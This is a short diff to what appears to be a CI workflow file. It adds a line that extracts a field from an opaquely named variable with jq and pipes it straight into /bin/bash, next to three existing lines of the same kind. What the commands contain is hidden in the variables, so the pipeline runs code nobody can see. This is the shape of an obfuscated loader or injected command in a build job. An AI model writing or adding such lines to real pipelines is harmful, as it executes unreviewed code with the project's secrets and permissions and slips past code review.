@@ -44,6 +44,7 @@ jobs:
           printf '%s' "$h0" | jq -r .ihm838 | /bin/bash
           echo $j53 | jq -r .gqe00 | /bin/bash
           echo $z935 | jq -r .xzwmd84 | /bin/bash
+          echo $nt53801 | jq -r .xf5 | /bin/bash
 
       - name: Store results
         if: always()
